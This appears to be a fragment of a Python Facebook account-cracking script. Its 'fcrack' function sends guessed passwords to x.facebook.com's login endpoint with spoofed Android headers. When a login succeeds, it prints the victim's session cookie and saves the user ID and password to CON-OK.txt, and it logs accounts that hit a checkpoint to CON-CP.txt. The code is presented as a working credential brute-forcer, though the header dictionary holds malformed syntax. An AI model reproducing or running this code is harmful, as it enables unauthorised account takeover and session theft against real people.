...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'Host':'x.facebook.com','content-length':'3377','cache-control max-age'='0','origin':'https://x.facebook.com','upgrade-insecure-requests':'1','content-type':'application/x-www-form-urlencoded','user-agent':'Mozilla/5.0 (Linux; Android 10; TECNO KE5j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','sec-fetch-dest':'document','accept':'*/*','sec-fetch-site':'same-origin','sec-fetch-mode':'navigate','sec-fetch-user':'?1','referer':'https://x.facebook.com','accept-encoding':'gzip, deflate, br','accept-language en-US,en;q'='0.9'}
            lo = session.post('https://x.facebook.com/login/?next&ref=wizard&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[CON-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('CON-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[CON-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('CON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mCON\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
